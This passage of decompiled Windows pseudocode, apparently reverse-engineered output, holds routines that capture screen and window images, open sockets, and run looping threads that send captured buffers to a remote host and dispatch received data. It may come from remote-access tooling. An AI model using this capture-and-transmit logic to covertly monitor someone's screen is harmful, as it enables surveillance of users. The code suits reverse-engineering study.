  local_14 = 0xffffffff;
  local_48 = (HDC)0x0;
  local_78 = (HBITMAP)0x0;
  local_44 = (HGDIOBJ)0x0;
  local_c = (HDC)0x0;
  local_6c = (HDC)0x0;
  local_6c = CreateDCW(L"DISPLAY",(LPCWSTR)0x0,(LPCWSTR)0x0,(DEVMODEW *)0x0);
  if (param_5 == (HWND)0x0) {
    local_c = CreateDCW(L"DISPLAY",(LPCWSTR)0x0,(LPCWSTR)0x0,(DEVMODEW *)0x0);
    if (local_c == (HDC)0x0) goto LAB_004037d6;
  }
  else {
    local_c = GetWindowDC(param_5);
  }
  local_4c = GetSystemMetrics(0);
  iVar1 = GetSystemMetrics(1);
  local_10 = param_1;
  local_70 = param_3 - param_1;
  if (param_1 < 0) {
    local_10 = 0;
    local_70 = param_3;
  }
  else if (local_4c <= param_1) {
    local_70 = 0;
  }
  if (local_4c - local_10 < local_70) {
    local_70 = local_4c - local_10;
  }
  local_4c = local_70;
  local_68 = param_2;
  local_8 = param_4 - param_2;
  if (param_2 < 0) {
    local_68 = 0;
    local_8 = param_4;
  }
  else if (iVar1 <= param_2) {
    local_8 = 0;
  }
  local_64 = local_8;
  if (0x400 < local_70) {
    local_4c = 0x400;
  }
  if (0x300 < local_8) {
    local_64 = 0x300;
  }
  if (((local_4c != 0) && (local_64 != 0)) &&
     (local_48 = CreateCompatibleDC(local_c), local_48 != (HDC)0x0)) {
    local_50 = 0;
    if (iStack00000018 != 1) {
      local_78 = CreateCompatibleBitmap(local_c,local_4c,local_64);
      local_44 = SelectObject(local_48,local_78);
                    // WARNING: Could not recover jumptable at 0x00403706. Too many branches
                    // WARNING: Treating indirect jump as call
      uVar2 = (*_DAT_0046eb14)(&DAT_0040370c,local_48,0,0,local_4c,local_64,local_c,local_10,
                               local_68,0xcc0020);
      return uVar2;
    }
    local_78 = CreateCompatibleBitmap(local_6c,local_4c,local_64);
    local_44 = SelectObject(local_48,local_78);
    local_50 = PrintWindow(param_5,local_48,0);
    if (local_50 != 0) {
      _memset(&local_40,0,0x2c);
      local_40.bmiHeader.biSize = 0x28;
      iVar1 = GetDIBits(local_48,local_78,0,0,(LPVOID)0x0,&local_40,0);
      if (iVar1 == 0) {
        GetLastError();
      }
      else {
        if (local_40.bmiHeader.biSizeImage == 0) {
          local_40.bmiHeader.biSizeImage =
               ((int)((uint)local_40.bmiHeader.biBitCount * local_40.bmiHeader.biWidth + 0x1f &
                     0xffffffe0) >> 3) * local_40.bmiHeader.biHeight;
        }
        local_40.bmiHeader.biCompression = 0;
                    // WARNING: Load size is inaccurate
        iVar1 = GetDIBits(local_48,local_78,0,local_40.bmiHeader.biHeight,(LPVOID)(*this + 0x2c),
                          &local_40,0);
        if (iVar1 == 0) {
          GetLastError();
        }
        else {
          *(DWORD *)((int)this + 4) = local_40.bmiHeader.biSizeImage + 0x2c;
                    // WARNING: Load size is inaccurate
          ptVar3 = &local_40;
          pDVar4 = *this;
          for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {
            *pDVar4 = (ptVar3->bmiHeader).biSize;
            ptVar3 = (tagBITMAPINFO *)&(ptVar3->bmiHeader).biWidth;
            pDVar4 = pDVar4 + 1;
          }
          local_14 = 0;
        }
      }
    }
  }
LAB_004037d6:
  if (local_48 != (HDC)0x0) {
    DeleteDC(local_48);
    local_48 = (HDC)0x0;
  }
  if (local_78 != (HBITMAP)0x0) {
    DeleteObject(local_78);
    local_78 = (HBITMAP)0x0;
  }
  if (local_c != (HDC)0x0) {
    DeleteDC(local_c);
    local_c = (HDC)0x0;
  }
  if (local_6c != (HDC)0x0) {
    DeleteDC(local_6c);
    local_6c = (HDC)0x0;
  }
  uVar2 = local_14;
  FUN_00403930();
  return uVar2;
}



bool FUN_00403850(void *param_1,int param_2,int param_3,int param_4,int param_5)

{
  HWND in_EAX;
  int iVar1;
  
  iVar1 = FUN_004034f0(param_1,param_2,param_3,param_4,param_5,in_EAX);
  return -1 < iVar1;
}



LPSTR * __thiscall FUN_00403890(void *this,LPSTR *param_1)

{
  char cVar1;
  int iVar2;
  HMODULE this_00;
  char *pcVar3;
  void *local_c;
  undefined *puStack_8;
  undefined4 uStack_4;
  
  uStack_4 = 0xffffffff;
  puStack_8 = &LAB_00421e88;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  iVar2 = (**(code **)(DAT_0042d02c + 0xc))(DAT_0042b0a0 ^ (uint)&stack0xffffffe8);
  *param_1 = (LPSTR)(iVar2 + 0x10);
  uStack_4 = 0;
  if (this != (void *)0x0) {
    pcVar3 = (char *)this;
    if (((uint)this & 0xffff0000) == 0) {
      this_00 = FUN_00403c10((uint)this & 0xffff);
      if (this_00 == (HMODULE)0x0) {
        ExceptionList = local_c;
        return param_1;
      }
      FUN_00403950(this_00,param_1);
      ExceptionList = local_c;
      return param_1;
    }
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
  }
  FUN_00403a10(this);
  ExceptionList = local_c;
  return param_1;
}



void FUN_00403930(void)

{
  int *piVar1;
  int iVar2;
  int *in_EAX;
  int **ppiVar3;
  
  ppiVar3 = (int **)(*in_EAX + -0x10);
  piVar1 = (int *)(*in_EAX + -4);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + -1;
  UNLOCK();
  if (iVar2 == 1 || iVar2 + -1 < 0) {
    (**(code **)(**ppiVar3 + 4))(ppiVar3);
  }
  return;
}



undefined4 __thiscall FUN_00403950(void *this,LPSTR *param_1)

{
  code *pcVar1;
  uint in_EAX;
  HRSRC pHVar2;
  ushort *puVar3;
  int cbMultiByte;
  undefined4 uVar4;
  
  pHVar2 = FindResourceW((HMODULE)this,(LPCWSTR)((in_EAX >> 4) + 1 & 0xffff),(LPCWSTR)0x6);
  if (pHVar2 != (HRSRC)0x0) {
    puVar3 = (ushort *)FUN_00403c90((HMODULE)this);
    if (puVar3 != (ushort *)0x0) {
      cbMultiByte = WideCharToMultiByte(3,0,(LPCWSTR)(puVar3 + 1),(uint)*puVar3,(LPSTR)0x0,0,
                                        (LPCSTR)0x0,(LPBOOL)0x0);
      if ((int)(1U - *(int *)(*param_1 + -4) | *(int *)(*param_1 + -8) - cbMultiByte) < 0) {
        FUN_00403b00(cbMultiByte);
      }
      WideCharToMultiByte(3,0,(LPCWSTR)(puVar3 + 1),(uint)*puVar3,*param_1,cbMultiByte,(LPCSTR)0x0,
                          (LPBOOL)0x0);
      if ((-1 < cbMultiByte) && (cbMultiByte <= *(int *)(*param_1 + -8))) {
        *(int *)(*param_1 + -0xc) = cbMultiByte;
        (*param_1)[cbMultiByte] = '\0';
        return 1;
      }
      FUN_00403cf0(0x80070057);
      pcVar1 = (code *)swi(3);
      uVar4 = (*pcVar1)();
      return uVar4;
    }
  }
  return 0;
}



void FUN_00403a10(void *param_1)

{
  void *pvVar1;
  uint uVar2;
  void *_Dst;
  void **in_EAX;
  void *extraout_ECX;
  void *pvVar3;
  void *_Src;
  rsize_t unaff_EDI;
  
  if (unaff_EDI == 0) {
    FUN_00403aa0();
    return;
  }
  pvVar3 = param_1;
  if (param_1 != (void *)0x0) goto LAB_00403a32;
  do {
    FUN_00403cf0(0x80070057);
    pvVar3 = extraout_ECX;
LAB_00403a32:
    pvVar1 = *in_EAX;
    uVar2 = *(uint *)((int)pvVar1 + -0xc);
    _Src = pvVar3;
    if ((int)(1U - *(int *)((int)pvVar1 + -4) | *(int *)((int)pvVar1 + -8) - unaff_EDI) < 0) {
      FUN_00403b00(unaff_EDI);
      _Src = param_1;
    }
    _Dst = *in_EAX;
    if (uVar2 < (uint)((int)pvVar3 - (int)pvVar1)) {
      _memcpy_s(_Dst,*(rsize_t *)((int)_Dst + -8),_Src,unaff_EDI);
    }
    else {
      _memmove_s(_Dst,*(rsize_t *)((int)_Dst + -8),(void *)((int)_Dst + ((int)pvVar3 - (int)pvVar1))
                 ,unaff_EDI);
    }
  } while (((int)unaff_EDI < 0) || (*(int *)((int)*in_EAX + -8) < (int)unaff_EDI));
  *(rsize_t *)((int)*in_EAX + -0xc) = unaff_EDI;
  *(undefined *)(unaff_EDI + (int)*in_EAX) = 0;
  return;
}



void FUN_00403aa0(void)

{
  int **ppiVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  int extraout_ECX;
  int *unaff_ESI;
  
  iVar4 = *unaff_ESI;
  ppiVar1 = (int **)(iVar4 + -0x10);
  piVar3 = *ppiVar1;
  if (*(int *)(iVar4 + -0xc) != 0) {
    piVar2 = (int *)(iVar4 + -4);
    if (*(int *)(iVar4 + -4) < 0) {
      if (*(int *)(iVar4 + -8) < 0) {
        FUN_00403cf0(0x80070057);
        iVar4 = extraout_ECX;
      }
      *(undefined4 *)(iVar4 + -0xc) = 0;
      *(undefined *)*unaff_ESI = 0;
      return;
    }
    LOCK();
    iVar4 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar4 == 1 || iVar4 + -1 < 0) {
      (**(code **)(**ppiVar1 + 4))(ppiVar1);
    }
    iVar4 = (**(code **)(*piVar3 + 0xc))();
    *unaff_ESI = iVar4 + 0x10;
  }
  return;
}



void __fastcall FUN_00403b00(int param_1)

{
  void *pvVar1;
  void **in_EAX;
  int iVar2;
  
  pvVar1 = *in_EAX;
  if (param_1 < *(int *)((int)pvVar1 + -0xc)) {
    param_1 = *(int *)((int)pvVar1 + -0xc);
  }
  if (1 < *(int *)((int)pvVar1 + -4)) {
    FUN_00403b50(in_EAX,param_1);
    return;
  }
  iVar2 = *(int *)((int)pvVar1 + -8);
  if (iVar2 < param_1) {
    if (iVar2 < 0x401) {
      iVar2 = iVar2 * 2;
    }
    else {
      iVar2 = iVar2 + 0x400;
    }
    if (iVar2 < param_1) {
      iVar2 = param_1;
    }
    FUN_00403bd0(param_1,iVar2);
  }
  return;
}



void FUN_00403b50(void **param_1,int param_2)

{
  int *piVar1;
  void *_Src;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  void **unaff_EBX;
  
  _Src = *param_1;
  iVar2 = *(int *)((int)_Src + -0xc);
  puVar3 = (undefined4 *)(**(code **)(**(int **)((int)_Src + -0x10) + 0x10))();
  iVar4 = (**(code **)*puVar3)(param_2,1);
  if (iVar4 == 0) {
    FUN_00403c00();
  }
  if (iVar2 < param_2) {
    param_2 = iVar2;
  }
  _memcpy_s((void *)(iVar4 + 0x10),param_2 + 1U,_Src,param_2 + 1U);
  *(int *)(iVar4 + 4) = iVar2;
  piVar1 = (int *)((int)_Src + -4);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + -1;
  UNLOCK();
  if (iVar2 == 1 || iVar2 + -1 < 0) {
    (**(code **)(**(int **)((int)_Src + -0x10) + 4))((int **)((int)_Src + -0x10));
  }
  *unaff_EBX = (void *)(iVar4 + 0x10);
  return;
}



void __fastcall FUN_00403bd0(undefined4 param_1,int param_2)

{
  int iVar1;
  int *unaff_ESI;
  
  iVar1 = *unaff_ESI;
  if ((*(int *)(iVar1 + -8) < param_2) && (0 < param_2)) {
    iVar1 = (**(code **)(**(int **)(iVar1 + -0x10) + 8))(iVar1 + -0x10,param_2,1);
    if (iVar1 != 0) goto LAB_00403bf7;
  }
  iVar1 = FUN_00403c00();
LAB_00403bf7:
  *unaff_ESI = iVar1 + 0x10;
  return;
}



void FUN_00403c00(void)

{
  code *pcVar1;
  
  FUN_00403cf0(0x8007000e);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



HMODULE __cdecl FUN_00403c10(uint param_1)

{
  HMODULE hModule;
  HRSRC pHVar1;
  uint uVar2;
  int local_4;
  
  uVar2 = 0;
  hModule = ATL::CAtlBaseModule::GetHInstanceAt((CAtlBaseModule *)&DAT_0042d048,0);
  local_4 = 1;
  while( true ) {
    if ((hModule == (HMODULE)0x0) || (uVar2 != 0)) {
      return (HMODULE)0x0;
    }
    pHVar1 = FindResourceExW(hModule,(LPCWSTR)0x6,(LPCWSTR)((param_1 >> 4) + 1 & 0xffff),0);
    uVar2 = 0;
    if ((pHVar1 != (HRSRC)0x0) && (uVar2 = FUN_00403c90(hModule), uVar2 != 0)) break;
    hModule = ATL::CAtlBaseModule::GetHInstanceAt((CAtlBaseModule *)&DAT_0042d048,local_4);
    local_4 = local_4 + 1;
  }
  return hModule;
}



uint __cdecl FUN_00403c90(HMODULE param_1)

{
  uint in_EAX;
  HGLOBAL hResData;
  ushort *puVar1;
  DWORD DVar2;
  ushort *puVar3;
  HRSRC unaff_EBX;
  uint uVar4;
  
  hResData = LoadResource(param_1,unaff_EBX);
  if (hResData == (HGLOBAL)0x0) {
    return 0;
  }
  puVar1 = (ushort *)LockResource(hResData);
  if (puVar1 != (ushort *)0x0) {
    DVar2 = SizeofResource(param_1,unaff_EBX);
    puVar3 = (ushort *)(DVar2 + (int)puVar1);
    for (uVar4 = in_EAX & 0xf; uVar4 != 0; uVar4 = uVar4 - 1) {
      if (puVar3 <= puVar1) {
        return 0;
      }
      puVar1 = puVar1 + *puVar1 + 1;
    }
    if (puVar1 < puVar3) {
      return -(uint)(*puVar1 != 0) & (uint)puVar1;
    }
  }
  return 0;
}



void FUN_00403cf0(undefined4 param_1)

{
  code *pcVar1;
  
  __CxxThrowException_8(&param_1,&DAT_004297b8);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_00403d10(undefined4 param_1)

{
  code *pcVar1;
  
  FUN_00404500();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_00403d20(undefined4 param_1)

{
  code *pcVar1;
  
  FUN_00404560();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined * FUN_00403d30(void)

{
  _DAT_0044e2d0 = 0;
  _DAT_0044e2d4 = 0;
  _DAT_0044e2d8 = 0;
  _DAT_0044e2dc = 0;
  _DAT_0044e2e0 = 0;
  DAT_0044e2e2 = 0;
  DAT_0044e2e6 = 1;
  _DAT_0044e2ea = 0;
  _memset(&DAT_0044e2ee,0,0x10000);
  DAT_0045e2ee = 0;
  _memset(&DAT_0045e2f2,0,0x10000);
  _DAT_0046eaf2 = 0;
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00403d10,&DAT_0044e2d0,0,(LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00403d20,&DAT_0044e2d0,0,(LPDWORD)0x0);
  return &DAT_0044e2d0;
}



void __thiscall FUN_00403de0(void *this,undefined4 param_1,int *param_2)

{
  short sVar1;
  int iVar2;
  short *psVar3;
  undefined2 *puVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined4 local_9ac;
  undefined4 local_9a8;
  undefined local_994 [400];
  undefined2 local_804;
  undefined local_802 [2038];
  uint uStack_c;
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)&local_9ac;
  local_804 = 0;
  _memset(local_802,0,0x7fe);
  puVar4 = &local_804;
  if (this != (void *)0x0) {
    puVar4 = (undefined2 *)this;
  }
  local_9ac = 0;
  local_9a8 = 0;
  *puVar4 = 0;
  iVar2 = Ordinal_115(0x101,local_994);
  if (iVar2 == 0) {
    iVar2 = Ordinal_23(2,1,6);
    *param_2 = iVar2;
    if (iVar2 != -1) {
      iVar2 = Ordinal_52();
      if (iVar2 == 0) {
        Ordinal_11();
        iVar2 = Ordinal_51(&stack0xfffff648,4,2);
        if (iVar2 != 0) goto LAB_00403fcf;
        psVar3 = &DAT_00426c44;
        do {
          sVar1 = *psVar3;
          *(short *)((int)(puVar4 + -0x213622) + (int)psVar3) = sVar1;
          psVar3 = psVar3 + 1;
        } while (sVar1 != 0);
        puVar6 = (undefined4 *)(puVar4 + -1);
        do {
          psVar3 = (short *)((int)puVar6 + 2);
          puVar6 = (undefined4 *)((int)puVar6 + 2);
        } while (*psVar3 != 0);
        *puVar6 = 10;
        puVar6 = (undefined4 *)(puVar4 + -1);
        do {
          psVar3 = (short *)((int)puVar6 + 2);
          puVar6 = (undefined4 *)((int)puVar6 + 2);
        } while (*psVar3 != 0);
      }
      else {
LAB_00403fcf:
        local_9a8 = *(undefined4 *)**(undefined4 **)(iVar2 + 0xc);
        local_9ac = CONCAT22(local_9ac._2_2_,2);
        Ordinal_9(local_4);
        iVar2 = Ordinal_4(*param_2,&stack0xfffff650,0x10);
        if (iVar2 == 0) goto LAB_00403fb5;
        psVar3 = &DAT_00426ca8;
        do {
          sVar1 = *psVar3;
          *(short *)((int)(puVar4 + -0x213654) + (int)psVar3) = sVar1;
          psVar3 = psVar3 + 1;
        } while (sVar1 != 0);
        puVar6 = (undefined4 *)(puVar4 + -1);
        do {
          psVar3 = (short *)((int)puVar6 + 2);
          puVar6 = (undefined4 *)((int)puVar6 + 2);
        } while (*psVar3 != 0);
        *puVar6 = 10;
        puVar6 = (undefined4 *)(puVar4 + -1);
        do {
          psVar3 = (short *)((int)puVar6 + 2);
          puVar6 = (undefined4 *)((int)puVar6 + 2);
        } while (*psVar3 != 0);
      }
      puVar5 = (undefined4 *)&DAT_00426c68;
      for (iVar2 = 0xf; iVar2 != 0; iVar2 = iVar2 + -1) {
        *puVar6 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar6 = puVar6 + 1;
      }
      *(undefined2 *)puVar6 = *(undefined2 *)puVar5;
      if (*param_2 != 0) {
        Ordinal_3(*param_2);
        *param_2 = 0;
      }
      goto LAB_00403fb5;
    }
    psVar3 = &DAT_00426c44;
    do {
      sVar1 = *psVar3;
      *(short *)((int)(puVar4 + -0x213622) + (int)psVar3) = sVar1;
      psVar3 = psVar3 + 1;
    } while (sVar1 != 0);
    puVar6 = (undefined4 *)(puVar4 + -1);
    do {
      psVar3 = (short *)((int)puVar6 + 2);
      puVar6 = (undefined4 *)((int)puVar6 + 2);
    } while (*psVar3 != 0);
    *puVar6 = 10;
    puVar6 = (undefined4 *)(puVar4 + -1);
    do {
      psVar3 = (short *)((int)puVar6 + 2);
      puVar6 = (undefined4 *)((int)puVar6 + 2);
    } while (*psVar3 != 0);
  }
  else {
    psVar3 = &DAT_00426c44;
    do {
      sVar1 = *psVar3;
      *(short *)((int)(puVar4 + -0x213622) + (int)psVar3) = sVar1;
      psVar3 = psVar3 + 1;
    } while (sVar1 != 0);
    puVar6 = (undefined4 *)(puVar4 + -1);
    do {
      psVar3 = (short *)((int)puVar6 + 2);
      puVar6 = (undefined4 *)((int)puVar6 + 2);
    } while (*psVar3 != 0);
    *puVar6 = 10;
    puVar6 = (undefined4 *)(puVar4 + -1);
    do {
      psVar3 = (short *)((int)puVar6 + 2);
      puVar6 = (undefined4 *)((int)puVar6 + 2);
    } while (*psVar3 != 0);
  }
  puVar5 = (undefined4 *)&DAT_00426c68;
  for (iVar2 = 0xf; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar6 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar6 = puVar6 + 1;
  }
  *(undefined2 *)puVar6 = *(undefined2 *)puVar5;
LAB_00403fb5:
  ___security_check_cookie_4(uStack_c ^ (uint)&stack0xfffff64c);
  return;
}



void FUN_00404070(void *param_1,void **param_2)

{
  short sVar1;
  uint uVar2;
  short *psVar3;
  uint unaff_EBX;
  void **ppvVar4;
  int *unaff_ESI;
  undefined auStack_810 [4];
  undefined4 local_80c;
  void *local_808;
  void *local_804 [512];
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)auStack_810;
  local_808 = param_1;
  ppvVar4 = local_804;
  if (param_2 != (void **)0x0) {
    ppvVar4 = param_2;
  }
  *(undefined2 *)ppvVar4 = 0;
  local_80c = 0;
  if (*unaff_ESI != 0) {
    param_1 = (void *)FUN_00410d7f(unaff_EBX);
    _memcpy(param_1,local_804[0],unaff_EBX);
    local_80c = CONCAT13((char)unaff_EBX,
                         CONCAT12((char)(unaff_EBX >> 8),
                                  CONCAT11((char)(unaff_EBX >> 0x10),(char)(unaff_EBX >> 0x18))));
    Ordinal_19(*unaff_ESI,&local_80c,4,0);
    uVar2 = Ordinal_19(*unaff_ESI,param_1);
    if ((uVar2 == 0xffffffff) || (uVar2 != unaff_EBX)) {
      psVar3 = &DAT_00426ca8;
      do {
        sVar1 = *psVar3;
        *(short *)((int)(ppvVar4 + -0x109b2a) + (int)psVar3) = sVar1;
        psVar3 = psVar3 + 1;
      } while (sVar1 != 0);
    }
    else {
      local_80c = 1;
    }
  }
  if (param_1 != (void *)0x0) {
    FUN_0040fb79(param_1);
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_810);
  return;
}



void __thiscall FUN_00404170(void *this,undefined2 *param_1)

{
  short sVar1;
  int iVar2;
  short *psVar3;
  undefined2 *puVar4;
  int *unaff_EBX;
  uint uVar5;
  size_t _Size;
  uint *unaff_EDI;
  undefined local_818;
  undefined local_817;
  undefined local_816;
  undefined local_815;
  undefined2 *puStack_814;
  undefined2 *local_810;
  void *local_80c;
  undefined4 local_808;
  undefined2 local_804 [1024];
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)&local_818;
  local_810 = local_804;
  if (param_1 != (undefined2 *)0x0) {
    local_810 = param_1;
  }
  puVar4 = local_810;
  *local_810 = 0;
  local_808 = 0;
  local_80c = this;
  if ((*unaff_EBX != 0) && (this != (void *)0x0)) {
    local_818 = 0;
    local_817 = 0;
    local_816 = 0;
    local_815 = 0;
    iVar2 = Ordinal_16(*unaff_EBX,&local_818,4,0);
    if (iVar2 == -1) {
      psVar3 = &DAT_00426cc8;
      do {
        sVar1 = *psVar3;
        *(short *)((int)(puVar4 + -0x213664) + (int)psVar3) = sVar1;
        psVar3 = psVar3 + 1;
      } while (sVar1 != 0);
    }
    else if (iVar2 != 0) {
      uVar5 = CONCAT31(CONCAT21(CONCAT11(local_818,local_817),local_816),local_815);
      _Size = 0;
      puVar4 = (undefined2 *)FUN_00410d7f(*unaff_EDI);
      local_810 = puVar4;
      if (0 < (int)*unaff_EDI) {
LAB_00404260:
        if (_Size < uVar5) {
          iVar2 = Ordinal_16(*unaff_EBX,_Size + (int)puVar4,*unaff_EDI - _Size,0);
          if ((iVar2 != -1) && (iVar2 != 0)) goto code_r0x00404281;
          psVar3 = &DAT_00426cc8;
          do {
            sVar1 = *psVar3;
            *(short *)((int)(local_810 + -0x213664) + (int)psVar3) = sVar1;
            psVar3 = psVar3 + 1;
          } while (sVar1 != 0);
          goto LAB_004042d9;
        }
      }
LAB_0040428b:
      if ((int)*unaff_EDI < (int)_Size) {
        _memcpy(local_80c,puVar4,*unaff_EDI);
      }
      else {
        _memcpy(local_80c,puVar4,_Size);
        *unaff_EDI = _Size;
      }
LAB_004042d9:
      if (puStack_814 != (undefined2 *)0x0) {
        FUN_0040fb79(puStack_814);
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_818);
  return;
code_r0x00404281:
  _Size = _Size + iVar2;
  puVar4 = puStack_814;
  if ((int)*unaff_EDI <= (int)_Size) goto LAB_0040428b;
  goto LAB_00404260;
}



bool FUN_00404300(void)

{
  char cVar1;
  char *in_EAX;
  int iVar2;
  char *pcVar3;
  
  if (2 < *(int *)(in_EAX + 0x16)) {
    if (*(int *)(in_EAX + 0x12) != 0) {
      iVar2 = Ordinal_3(*(int *)(in_EAX + 0x12));
      if (iVar2 == 0) {
        *(undefined4 *)(in_EAX + 0x12) = 0;
      }
    }
    *(undefined4 *)(in_EAX + 0x16) = 1;
  }
  pcVar3 = in_EAX;
  do {
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + 1;
  } while (cVar1 != '\0');
  if ((7 < (uint)((int)pcVar3 - (int)(in_EAX + 1))) && (*(ushort *)(in_EAX + 0x10) != 0)) {
    iVar2 = FUN_00403de0(in_EAX + 0x20022,(uint)*(ushort *)(in_EAX + 0x10),(int *)(in_EAX + 0x12));
    if (iVar2 != 0) {
      *(undefined4 *)(in_EAX + 0x16) = 3;
    }
    return iVar2 != 0;
  }
  return false;
}



void FUN_00404380(void)

{
  char cVar1;
  WCHAR WVar2;
  LPCWSTR pWVar3;
  char *pcVar4;
  char *pcVar5;
  short unaff_BX;
  LPCWSTR unaff_ESI;
  int unaff_EDI;
  CHAR local_108 [260];
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)local_108;
  local_108[0] = '\0';
  _memset(local_108 + 1,0,0x103);
  pWVar3 = unaff_ESI;
  do {
    WVar2 = *pWVar3;
    pWVar3 = pWVar3 + 1;
  } while (WVar2 != L'\0');
  pcVar4 = local_108;
  pcVar5 = local_108;
  WideCharToMultiByte(0,0,unaff_ESI,((int)pWVar3 - (int)(unaff_ESI + 1) >> 1) + 1,local_108,0x104,
                      (LPCSTR)0x0,(LPBOOL)0x0);
  do {
    cVar1 = *pcVar4;
    pcVar4 = pcVar4 + 1;
  } while (cVar1 != '\0');
  if ((8 < (uint)((int)pcVar4 - (int)(local_108 + 1))) && (unaff_BX != 0)) {
    do {
      cVar1 = *pcVar5;
      pcVar5[unaff_EDI - (int)local_108] = cVar1;
      pcVar5 = pcVar5 + 1;
    } while (cVar1 != '\0');
    *(short *)(unaff_EDI + 0x10) = unaff_BX;
    FUN_00404300();
    ___security_check_cookie_4(local_4 ^ (uint)local_108);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_108);
  return;
}



undefined4 FUN_00404450(void)

{
  int iVar1;
  int unaff_ESI;
  
  if (2 < *(int *)(unaff_ESI + 0x16)) {
    if (*(int *)(unaff_ESI + 0x12) != 0) {
      iVar1 = Ordinal_3(*(int *)(unaff_ESI + 0x12));
      if (iVar1 == 0) {
        *(undefined4 *)(unaff_ESI + 0x12) = 0;
      }
    }
    *(undefined4 *)(unaff_ESI + 0x16) = 1;
    return 1;
  }
  return 1;
}



undefined4 FUN_00404480(void *param_1,int param_2)

{
  size_t _Size;
  undefined4 uVar1;
  int unaff_ESI;
  
  _Size = DAT_0042c448;
  uVar1 = 0;
  if (2 < *(int *)(unaff_ESI + 0x16)) {
    if ((param_1 == (void *)0x0) || (0xffff < (int)DAT_0042c448)) {
      return 0;
    }
    if (param_2 == 1) {
      while ((2 < *(int *)(unaff_ESI + 0x16) && (*(int *)(unaff_ESI + 0x16) == 0xb))) {
        Sleep(0xf);
      }
    }
    if (*(int *)(unaff_ESI + 0x16) != 0xb) {
      _memcpy((void *)(unaff_ESI + 0x1e),param_1,_Size);
      *(size_t *)(unaff_ESI + 0x1a) = _Size;
      *(undefined4 *)(unaff_ESI + 0x16) = 0xb;
      uVar1 = 1;
    }
  }
  return uVar1;
}



void FUN_00404500(void)

{
  int iVar1;
  int unaff_ESI;
  
LAB_00404510:
  do {
    if (2 < *(int *)(unaff_ESI + 0x16)) {
      *(int *)(unaff_ESI + 0x1001e) = 0x10000;
      iVar1 = FUN_00404170((void *)(unaff_ESI + 0x10022),(undefined2 *)(unaff_ESI + 0x20022));
      if (iVar1 == 0) {
        *(undefined4 *)(unaff_ESI + 0x16) = 1;
        Sleep(0x1e);
        goto LAB_00404510;
      }
      if ((4 < *(int *)(unaff_ESI + 0x1001e)) && (*(code **)(unaff_ESI + 0x20822) != (code *)0x0)) {
        (**(code **)(unaff_ESI + 0x20822))();
      }
    }
    Sleep(0x1e);
  } while( true );
}



void FUN_00404560(void)

{
  int iVar1;
  int unaff_EDI;
  
  do {
    if ((2 < *(int *)(unaff_EDI + 0x16)) && (*(int *)(unaff_EDI + 0x16) == 0xb)) {
      iVar1 = FUN_00404070((void *)(unaff_EDI + 0x1e),(void **)(unaff_EDI + 0x20022));
      *(uint *)(unaff_EDI + 0x16) = (-(uint)(iVar1 != 0) & 9) + 1;
    }
    Sleep(0x1e);
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_004045b0(undefined4 param_1,void **param_2,undefined4 param_3,void *param_4)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  undefined4 uStack_244;
  void **local_240;
  int local_23c;
  undefined2 local_238;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  void *local_10;
  uint local_8;
  uint uStack_4;
  
  local_8 = DAT_0042b0a0 ^ (uint)&uStack_244;
  local_240 = param_2;
  piVar3 = FUN_00408880(param_3,param_1);
  if (piVar3 != (int *)0x0) {
    if (*piVar3 == 1) {
      piVar1 = (int *)piVar3[1];
      if (*(uint *)(*piVar1 + 4) < 0x80000000) {
        if (piVar1[1] != -1) {
          FUN_00407ee0();
          param_2 = local_240;
        }
        piVar1[1] = -1;
        local_30 = 0;
        local_2c = 0;
        local_28 = 0;
        local_24 = 0;
        local_20 = 0;
        local_1c = 0;
        local_18 = 0;
        local_14 = 0;
        _DAT_0044e28c = 0;
      }
      else {
        _DAT_0044e28c = 0x10000;
      }
    }
    else {
      _DAT_0044e28c = 0x80000;
    }
    local_23c = 0;
    local_238 = 0;
    local_10 = (void *)0x0;
    if (*piVar3 == 1) {
      _DAT_0044e28c = FUN_00408100((void *)piVar3[1],0,&local_23c);
    }
    else {
      _DAT_0044e28c = 0x80000;
    }
    if (*piVar3 == 1) {
      _DAT_0044e28c = FUN_004086c0(param_4,*param_2);
    }
    else {
      _DAT_0044e28c = 0x80000;
    }
    *param_2 = local_10;
    if (*piVar3 == 1) {
      iVar2 = piVar3[1];
      _DAT_0044e28c = FUN_00408820();
      if (iVar2 != 0) {
        FUN_00408930();
      }
      FUN_0040fb79(piVar3);
    }
    else {
      _DAT_0044e28c = 0x80000;
    }
  }
  uStack_244 = 0x40471a;
  ___security_check_cookie_4(uStack_4 ^ (uint)&local_240);
  return;
}



